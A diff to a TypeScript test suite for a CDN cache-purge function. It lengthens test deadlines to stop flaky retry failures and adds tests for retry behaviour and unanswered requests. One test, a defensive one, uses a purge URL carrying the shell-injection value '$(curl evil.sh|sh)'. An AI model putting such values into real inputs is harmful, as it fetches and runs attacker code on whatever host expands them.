@@ -178,6 +178,15 @@ describe('isRecord', () => {
   });
 });
 
+/**
+ * The deadline for a test whose subject is the TRANSPORT failure, so it is never the deadline's.
+ * `purgePost` is idempotent, so `outbound()` retries a rejection (`OUTBOUND_RETRY`: 3 attempts,
+ * waits under a second) inside it. At `timeoutMs: 10` the deadline raced that loop, and on a loaded
+ * runner it won: main CI run 42978963381 reported X_OUTBOUND_TIMEOUT where the test asserts
+ * ECONNREFUSED. The deadline path has its own test below.
+ */
+const TRANSPORT_ONLY_MS = 60_000;
+
 describe('purgePost', () => {
   test('sends JSON with the driver headers and the caller deadline', async () => {
     const calls: { url: string; init: RequestInit }[] = [];
@@ -205,22 +214,25 @@ describe('purgePost', () => {
   // Nothing at the edge saw this request, so the identical one can still land: that is the whole
   // difference between a transport failure and a refusal, and it is why `retryable` is not a guess.
   test('a request that never got a status is retryable and the fix is a reachability probe', async () => {
+    let calls = 0;
     const failure = await purgePost({
       driver: 'cloudflare',
       url: 'https://cdn.test/purge',
       headers: {},
       body: {},
-      timeoutMs: 10,
+      timeoutMs: TRANSPORT_ONLY_MS,
       // A coded transport failure, not a bare `Error`: `purgePost` reads `error.message` for its
       // own cause, so the code and the reason both have to survive into the reported detail.
-      fetch: () =>
-        Promise.reject(
+      fetch: () => {
+        calls += 1;
+        return Promise.reject(
           new CacheDriverUnavailableError({
             driver: 'cloudflare',
             cause: 'ECONNREFUSED reaching api.cloudflare.test from this host',
             fix: 'curl -sS -m 5 -o /dev/null https://api.cloudflare.com/client/v4',
           }),
-        ),
+        );
+      },
     }).then(
       () => undefined,
       (error: unknown) =>
@@ -231,6 +243,38 @@ describe('purgePost', () => {
     expect(failure?.meta?.retryable).toBe(true);
     expect(failure?.fix).toBe('curl -sS -m 5 -o /dev/null https://cdn.test/purge');
     expect(failure?.cause).toContain('ECONNREFUSED');
+    // Retryable is ACTED on, not only reported: the purge is idempotent, so the identical request
+    // went out again before the purge gave up.
+    expect(calls).toBeGreaterThan(1);
+  });
+
+  // The other way a request gets no status: the CDN never answers. The deadline is the whole call,
+  // and what ends it is a coded, retryable purge failure naming the deadline — not a hang.
+  test('a CDN that never answers is the deadline, still retryable, still the reachability probe', async () => {
+    const failure = await purgePost({
+      driver: 'fastly',
+      url: 'https://cdn.test/purge',
+      headers: {},
+      body: {},
+      timeoutMs: 20,
+      // Settles only when aborted, as a real `fetch` does: nothing but the deadline can end it.
+      fetch: (_url, init) =>
+        new Promise<Response>((_resolve, reject) => {
+          init.signal?.addEventListener('abort', () => reject(init.signal?.reason), {
+            once: true,
+          });
+        }),
+    }).then(
+      () => undefined,
+      (error: unknown) =>
+        error as { code?: string; cause?: string; fix?: string; meta?: { retryable?: boolean } },
+    );
+
+    expect(failure?.code).toBe('X_CACHE_PURGE_FAILED');
+    expect(failure?.meta?.retryable).toBe(true);
+    expect(failure?.cause).toContain('X_OUTBOUND_TIMEOUT');
+    expect(failure?.cause).toContain('20 ms');
+    expect(failure?.fix).toBe('curl -sS -m 5 -o /dev/null https://cdn.test/purge');
   });
 
   test('a rejection that fights being read is still a coded purge failure', async () => {
@@ -250,7 +294,7 @@ describe('purgePost', () => {
       url: 'https://cdn.test/purge',
       headers: {},
       body: {},
-      timeoutMs: 10,
+      timeoutMs: TRANSPORT_ONLY_MS,
       fetch: () => Promise.reject(hostile),
     }).then(
       () => undefined,
@@ -284,7 +328,7 @@ describe('a purge endpoint a shell would read', () => {
       url: 'https://cdn.test/$(curl evil.sh|sh)/purge',
       headers: {},
       body: {},
-      timeoutMs: 10,
+      timeoutMs: TRANSPORT_ONLY_MS,
       fetch: () => Promise.reject(new TypeError('ECONNREFUSED')),
     }).then(
       () => undefined,
